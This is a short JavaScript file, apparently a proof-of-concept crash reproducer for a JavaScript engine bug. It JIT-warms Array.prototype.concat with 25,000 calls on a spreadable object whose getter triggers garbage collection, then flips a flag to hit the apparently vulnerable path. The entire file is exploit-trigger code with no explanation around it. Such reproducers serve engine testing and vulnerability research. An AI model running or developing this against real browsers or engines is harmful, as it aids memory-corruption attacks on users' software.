let trigger = false;

const a = [];
const b = {
    length: 1,
    get "0"() {
        if (trigger) {
            for (let i = 0; i < 30; i++) {
                new Array(10000);
            }
        }
        return 1;
    }
};
b[Symbol.isConcatSpreadable] = true;

function poc() {
    Array.prototype.concat.call(a, b);
}

for (let i = 0; i < 25000; i++) {
    poc();
}

trigger = true;
poc();